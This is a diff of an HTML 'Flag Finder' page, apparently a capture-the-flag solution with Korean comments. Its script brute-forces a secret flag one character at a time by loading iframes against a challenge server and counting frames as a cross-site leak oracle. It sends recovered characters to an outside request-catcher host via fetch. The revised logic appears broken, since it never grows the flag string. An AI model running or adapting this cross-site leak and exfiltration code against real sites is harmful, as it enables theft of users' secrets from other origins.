@@ -6,42 +6,36 @@
     <title>Flag Finder</title>
 </head>
 <body>
-    <h1>Flag Finderㅇㅇㅇ</h1>
+    <h1>Flag Finderㅇㅇ</h1>
     <script>
-        const checkFlag = async () => {
-            let server_flag = '';
+        let server_flag = ''; // 전역 변수
+        let previousGoblinCount = 0; // 이전 goblin iframe 개수
 
+        const checkFlag = async () => {
             for (let i = 32; i <= 127; i++) {
                 const flag = server_flag + String.fromCharCode(i);
                 const requestUrl = `http://war.sschall.xyz:60001/flag?flag=${encodeURIComponent(flag)}`;
 
                 // iframe 생성
                 const iframe = document.createElement('iframe');
-                iframe.id = 'goblin'; // ID 설정
                 iframe.src = requestUrl;
                 document.body.appendChild(iframe);
 
-                // iframe이 로드될 때까지 기다림
-                await new Promise(resolve => {
-                    setTimeout(() => {
-                        // goblin iframe의 개수를 확인
-                        const goblinCount = document.querySelectorAll('iframe#goblin').length;
+                // goblin iframe 개수 체크
+                setTimeout(() => {
+                    const goblinIframes = document.querySelectorAll('iframe[id="goblin"]');
+                    const currentGoblinCount = goblinIframes.length;
 
-                        // 만약 goblin iframe이 증가했다면
-                        if (goblinCount > 1) {
-                            server_flag += String.fromCharCode(i); // 해당 문자를 추가
-                            console.log(`Current FLAG: ${server_flag}`);
-
-                            // 최종 FLAG를 서버로 보내기
-                            const finalRequestUrl = `https://xlduugj.request.dreamhack.games?flag=${encodeURIComponent(server_flag)}`;
-                            fetch(finalRequestUrl); // 최종 요청
-                        }
-
-                        // iframe을 제거하여 메모리 누수 방지
-                        document.body.removeChild(iframe);
-                        resolve();
-                    }, 1000); // 1초 후에 iframe 제거
-                });
+                    if (currentGoblinCount > previousGoblinCount) {
+                        // goblin iframe이 증가했으면, 다음 문자로 넘어감
+                        previousGoblinCount = currentGoblinCount;
+                    } else {
+                        // goblin iframe이 증가하지 않았다면
+                        console.log(`Found flag character: ${flag}`);
+                        const finalRequestUrl = `https://xlduugj.request.dreamhack.games?flag=${encodeURIComponent(flag)}`;
+                        fetch(finalRequestUrl); // 응답을 기다리지 않고 요청만 보냄
+                    }
+                }, 100); // 100ms 후에 체크 (서버 응답을 기다리기 위함)
             }
         };
 
